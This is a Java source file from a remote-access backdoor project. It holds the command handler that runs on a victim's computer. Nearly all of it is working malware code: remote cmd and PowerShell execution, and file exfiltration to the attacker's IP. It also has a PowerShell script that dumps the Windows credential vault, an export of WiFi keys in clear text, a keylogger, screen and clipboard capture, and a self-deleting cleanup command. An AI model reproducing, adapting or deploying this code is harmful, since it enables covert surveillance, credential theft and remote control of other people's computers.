package dev.thatcherclough.betterbackdoor.backdoor;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Scanner;

import javax.imageio.ImageIO;

import dev.thatcherclough.betterbackdoor.backend.DuckyScripts;
import dev.thatcherclough.betterbackdoor.backend.FTP;
import dev.thatcherclough.betterbackdoor.backend.KeyLogger;
import dev.thatcherclough.betterbackdoor.backend.Utils;

import org.apache.commons.io.FileUtils;

public class HandleCommand {

	/**
	 * Handles command.
	 * <p>
	 * Handles command {@code command} and sets {@code send} to an appropriate
	 * response. Uses {@link Backdoor#out} to send the response.
	 *
	 * @param command command given to the backdoor
	 */
	public static void handle(String command) throws IOException {
		StringBuilder send = new StringBuilder();
		if (command.equals("help"))
			send = new StringBuilder("[cmd] Open a command prompt shell\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
					+ "[exfiles] Exfiltarte files based on extension\n[expass] Exfiltrate Microsoft Edge and WiFi passwords\n"
					+ "[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"
					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get a screenshot of vitim's computer\n"
					+ "[cb] Get text currently copied to victim's clipboard\n[cat] Get contents of a file on victim's computer\n"
					+ "[zip] Compress a directory to a ZIP file\n[unzip] Decompress a ZIP file\n"
					+ "[remove] Remove backdoor and all backdoor files from victim's computer\n[exit] Exit");
		else if (command.equals("current-dir"))
			send = new StringBuilder(System.getProperty("user.dir"));
		else if (command.equals("current-cmd-dir"))
			send = new StringBuilder(Utils.currentCMDDirectory);
		else if (command.startsWith("cmd"))
			send = new StringBuilder(Utils.runCommand(command.substring(4), true));
		else if (command.startsWith("ps") || command.startsWith("ds")) {
			File file = new File(command.substring(3));
			try {
				if (command.startsWith("ps") && file.exists())
					send = new StringBuilder(Utils.runPSScript(command.substring(3)));
				else if (command.startsWith("ds") && file.exists() && DuckyScripts.run(command.substring(3)))
					send = new StringBuilder("DuckyScript successfully executed");
				else
					throw new Exception();
			} catch (Exception e) {
				send = new StringBuilder("An error occurred when trying to execute script");
				if (e.getMessage() != null)
					send.append(":\n").append(e.getMessage());
			} finally {
				try {
					FileUtils.forceDelete(file);
				} catch (Exception ignored) {
				}
			}
		} else if (command.startsWith("exfiles")) {
			File exfiltratedFiles = new File(Backdoor.gatheredDir + "ExfiltratedFiles");
			try {
				Utils.exfilFiles(command.substring(command.indexOf(" "), command.indexOf("*")),
						new ArrayList<>(Arrays.asList(command.substring(command.indexOf("*") + 1).split(","))));
				Utils.zipDir(exfiltratedFiles.getAbsolutePath());
				FTP.backdoor(exfiltratedFiles.getAbsolutePath() + ".zip", "send", Backdoor.ip);
				waitForSocketTransfer();
				send = new StringBuilder("Files exfiltrated");
			} catch (Exception e) {
				send = new StringBuilder("An error occurred when trying to exfiltrate files");
				if (e.getMessage() != null)
					send.append(":\n").append(e.getMessage());
			} finally {
				try {
					FileUtils.forceDelete(exfiltratedFiles);
					FileUtils.forceDelete(new File(exfiltratedFiles.getAbsolutePath() + ".zip"));
				} catch (Exception ignored) {
				}
			}
		} else if (command.equals("expass")) {
			File exfiltratedPasswords = new File(Backdoor.gatheredDir + "ExfiltratedPasswords");
			try {
				if (!exfiltratedPasswords.mkdir())
					throw new Exception("Could not create directory");
				File exfilBrowserCredsScript = new File(
						exfiltratedPasswords.getAbsolutePath() + File.separator + "ExfilBrowserCreds.ps1");
				PrintWriter out = new PrintWriter(exfilBrowserCredsScript);
				out.println("$filename=$PSScriptRoot+\"\\BrowserPasswords.txt\"\n"
						+ "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n"
						+ "$creds = (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()\n"
						+ "foreach ($c in $creds) {$c.RetrievePassword()}\n"
						+ "$creds | Format-List -Property Resource,UserName,Password | Out-File $filename\n" + "exit");
				out.flush();
				out.close();
				Utils.runPSScript(exfilBrowserCredsScript.getAbsolutePath());
				Utils.runCommand("netsh wlan export profile key=clear folder=" + exfiltratedPasswords.getAbsolutePath(), false);
				FileUtils.forceDelete(exfilBrowserCredsScript);
				Utils.zipDir(exfiltratedPasswords.getAbsolutePath());
				FTP.backdoor(exfiltratedPasswords.getAbsolutePath() + ".zip", "send", Backdoor.ip);
				waitForSocketTransfer();
				send = new StringBuilder("Passwords exfiltrated");
			} catch (Exception e) {
				send = new StringBuilder("An error occurred when trying to exfiltrate passwords");
				if (e.getMessage() != null)
					send.append(":\n").append(e.getMessage());
			} finally {
				try {
					FileUtils.forceDelete(exfiltratedPasswords);
					FileUtils.forceDelete(new File(exfiltratedPasswords.getAbsolutePath() + ".zip"));
				} catch (Exception ignored) {
				}
			}
		} else if (command.startsWith("filetype")) {
			File file = new File(command.substring(9));
			if (file.isFile())
				send = new StringBuilder("file");
			else if (file.isDirectory())
				send = new StringBuilder("directory");
			else
				send = new StringBuilder("not real");
		} else if (command.startsWith("filesend")) {
			try {
				FTP.backdoor(command.substring(9), "rec", Backdoor.ip);
				waitForSocketTransfer();
				send = new StringBuilder("File sent");
			} catch (Exception e) {
				send = new StringBuilder("An error occurred when trying to send file");
				if (e.getMessage() != null)
					send.append(":\n").append(e.getMessage());
			}
		} else if (command.startsWith("filerec")) {
			File file = new File(command.substring(8));
			try {
				if (file.isFile())
					FTP.backdoor(file.getAbsolutePath(), "send", Backdoor.ip);
				else if (file.isDirectory()) {
					Utils.zipDir(file.getAbsolutePath());
					FTP.backdoor(file.getAbsolutePath() + ".zip", "send", Backdoor.ip);
				}

				waitForSocketTransfer();
				send = new StringBuilder("File received");
			} catch (Exception e) {
				send = new StringBuilder("An error occurred when trying to receive file");
				if (e.getMessage() != null)
					send.append(":\n").append(e.getMessage());
			} finally {
				try {
					if (file.isDirectory())
						FileUtils.forceDelete(new File(file.getAbsolutePath() + ".zip"));
				} catch (Exception ignored) {
				}
			}
		} else if (command.startsWith("keylog")) {
			Thread keyLogger = new Thread(() -> KeyLogger.start(command.substring(7)));
			keyLogger.start();
			send = new StringBuilder("Keys are being logged to '" + command.substring(7) + "\\keys.log' on victim's computer");
		} else if (command.equals("ss")) {
			File screenshot = new File(Backdoor.gatheredDir + "screenshot.png");
			try {
				ImageIO.write(
						new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())),
						"png", screenshot);
				FTP.backdoor(screenshot.getAbsolutePath(), "send", Backdoor.ip);
				waitForSocketTransfer();
				send = new StringBuilder("Screenshot received");
			} catch (Exception e) {
				send = new StringBuilder("An error occurred when trying to receive screenshot");
				if (e.getMessage() != null)
					send.append(":\n").append(e.getMessage());
			} finally {
				try {
					FileUtils.forceDelete(screenshot);
				} catch (IOException ignored) {
				}
			}
		} else if (command.equals("cb"))
			try {
				String clipBoard = (String) Toolkit.getDefaultToolkit().getSystemClipboard()
						.getData(DataFlavor.stringFlavor);
				if (clipBoard.isEmpty())
					send = new StringBuilder("Nothing copied to victim's clipboard");
				else
					send = new StringBuilder("Victim's clipboard:\n" + clipBoard);
			} catch (Exception e) {
				send = new StringBuilder("An error occurred when trying to get victim's clipboard");
				if (e.getMessage() != null)
					send.append(":\n").append(e.getMessage());
			}
		else if (command.startsWith("cat"))
			try {
				Scanner in = new Scanner(new File(command.substring(4)));
				while (in.hasNextLine())
					send.append(in.nextLine()).append("\n");
				in.close();
			} catch (Exception e) {
				send = new StringBuilder("An error occurred when trying to get file");
				if (e.getMessage() != null)
					send.append(":\n").append(e.getMessage());
			}
		else if (command.startsWith("zip"))
			try {
				File dir = new File(command.substring(4));
				if (!dir.isDirectory())
					throw new Exception("Not a directory");
				Utils.zipDir(dir.getAbsolutePath());
				send = new StringBuilder("Directory compressed to '" + dir.getAbsolutePath() + ".zip'");
			} catch (Exception e) {
				send = new StringBuilder("An error occurred when compressing directory");
				if (e.getMessage() != null)
					send.append(":\n").append(e.getMessage());
			}
		else if (command.startsWith("unzip"))
			try {
				String output = Utils.unzip(command.substring(6));
				send = new StringBuilder("Contents of ZIP file decompressed to '" + output + "'");
			} catch (Exception e) {
				send = new StringBuilder("An error occurred when decompressing directory");
				if (e.getMessage() != null)
					send.append(":\n").append(e.getMessage());
			}
		else if (command.equals("remove"))
			try {
				Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && cd "+System.getProperty("user.dir")+" && del /f /q run.jar run.bat && rd /s /q "
						+ Backdoor.gatheredDir + " jre");
				System.exit(0);
			} catch (Exception e) {
				send = new StringBuilder("An error occurred when trying to remove files");
				if (e.getMessage() != null)
					send.append(":\n").append(e.getMessage());
			}
		else if (!command.isEmpty())
			send = new StringBuilder("Command not found");
		Backdoor.out.writeObject(send.toString());
		Backdoor.out.flush();
	}

	/**
	 * Waits for the socket file transfer to result in either a success or error.
	 *
	 * @throws Exception
	 */
	private static void waitForSocketTransfer() throws Exception {
		while (!FTP.socketTransferDone && FTP.error == null)
			Thread.sleep(10);
		if (FTP.socketTransferDone)
			FTP.socketTransferDone = false;
		if (FTP.error != null) {
			String error = FTP.error;
			FTP.error = null;
			throw new Exception(error);
		}
	}
}